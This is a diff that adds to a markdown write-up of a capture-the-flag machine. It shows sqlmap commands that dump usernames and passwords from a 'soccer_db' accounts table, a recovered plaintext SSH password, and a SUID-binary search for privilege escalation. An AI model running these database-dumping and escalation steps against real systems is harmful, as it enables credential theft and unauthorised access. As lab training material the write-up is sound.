@@ -291,6 +291,46 @@ sqlmap -u "http://localhost:8081/?id=1" --batch --dbs
 
 ![image](https://user-images.githubusercontent.com/69868171/218151389-9fc7213d-abb8-4b63-a4cd-63127bcf42fa.png)
 
-It works `soccer_db` seems interesting let list the tables with sqlmap.
+It works `soccer_db` seems interesting let list the tables with sqlmap and possible aso dump all columns.
+
+```
+sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db --tables
+```
+
+When we go the tables we can go ahead and dump the interesting columns.
+
+```
+sqlmap -u "http://localhost:8081/?id=1" --batch -D soccer_db -T accounts -C id,email,password,username  --dump
+```
+
+![image](https://user-images.githubusercontent.com/69868171/218163012-10d72288-9e01-4eb6-abc3-708338c4b2ba.png)
+
+
+We got the user `player`password in plaintext let try on SSH.
+
+Username: player
+Password:- PlayerOftheMatch2022
+
+![image](https://user-images.githubusercontent.com/69868171/218163736-1836bc02-fa26-4a72-890e-da235dd938f5.png)
+
+
+We have access and we should have the user.txt in the home folder of user player.
+
+
+![image](https://user-images.githubusercontent.com/69868171/218163928-0b3a3fbb-918c-43ea-b1c6-950507c8993f.png)
+
+
+#### Privilege Escalation.
+
+Nothing on sudo we decided to check for SUID permission.
+
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+
+![image](https://user-images.githubusercontent.com/69868171/218164706-d105101b-7e01-40e6-b7f8-0a66f749863f.png)
+
+
+Doas seems interesting let check the conf file.
 
 
